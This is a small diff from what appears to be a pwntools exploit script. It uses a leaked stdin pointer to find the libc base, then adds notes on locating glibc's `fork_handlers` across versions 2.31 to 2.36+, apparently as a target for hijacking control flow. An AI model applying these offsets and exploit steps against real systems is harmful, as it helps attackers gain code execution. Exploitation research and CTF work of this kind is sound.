@@ -56,7 +56,15 @@ log.success(f"stdin leak: {hex(stdin_leak)}")
 libc.address = stdin_leak - libc.sym["_IO_2_1_stdin_"]
 log.success(f"libc base: {hex(libc.address)}")
 
-# fork_handlers' address in glibc 2.36+ = <re_syntax_options@@GLIBC_2.2.5+0x80>
+# After my local tests, following are the addresses of fork_handlers in different glibc versions.
+# For glibc 2.31:
+# objdump -d libc.so.6 | grep "<__abort_msg@@GLIBC_PRIVATE+0xbe0>"
+# For glibc 2.35:
+# objdump -d libc.so.6 | grep "<getdate_err@@GLIBC_2.2.5+0x300>"
+# Especially for glibc 2.35-0ubuntu3.11:
+# objdump -d libc.so.6 | grep "<fork_handlers>"
+# For glibc 2.36+:
+# objdump -d libc.so.6 | grep "<re_syntax_options@@GLIBC_2.2.5+0x80>"
 fork_handlers = libc.sym.re_syntax_options + 0x80
 log.success(f"fork_handlers: {hex(fork_handlers)}")
 
